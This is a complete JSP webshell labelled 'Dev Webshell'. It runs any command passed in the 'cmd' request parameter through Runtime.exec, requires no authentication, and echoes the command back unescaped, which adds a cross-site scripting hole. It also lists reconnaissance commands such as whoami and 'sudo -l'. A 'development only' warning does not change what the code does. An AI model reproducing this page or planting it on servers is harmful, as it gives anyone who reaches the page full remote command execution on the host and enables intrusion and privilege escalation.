<%@ page import="java.io.*,java.util.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    // Simple webshell for development server
    String cmd = request.getParameter("cmd");
    String result = "";
    
    if (cmd != null && !cmd.trim().isEmpty()) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(p.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            result = output.toString();
        } catch (Exception e) {
            result = "Error: " + e.getMessage();
        }
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>Dev Webshell</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #f0f0f0; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; }
        input[type="text"] { width: 70%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        .output { background: #e8e8e8; padding: 10px; margin-top: 10px; border: 1px solid #ccc; }
        .warning { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Dev Webshell</h2>
        <p class="warning">WARNING: Development only! Do not use in production.</p>
        
        <form method="get">
            <input type="text" name="cmd" value="<%= cmd != null ? cmd : "" %>" placeholder="Enter command">
            <input type="submit" value="Execute">
        </form>
        
        <% if (cmd != null && !cmd.trim().isEmpty()) { %>
            <div class="output">
                <strong>Command:</strong> <%= cmd %><br>
                <strong>Output:</strong><br>
                <pre><%= result %></pre>
            </div>
        <% } %>
        
        <h3>Quick Commands:</h3>
        <ul>
            <li>whoami</li>
            <li>pwd</li>
            <li>ls -la</li>
            <li>df -h</li>
            <li>sudo -l</li>
            <li>ps aux | head -10</li>
        </ul>
    </div>
</body>
</html>
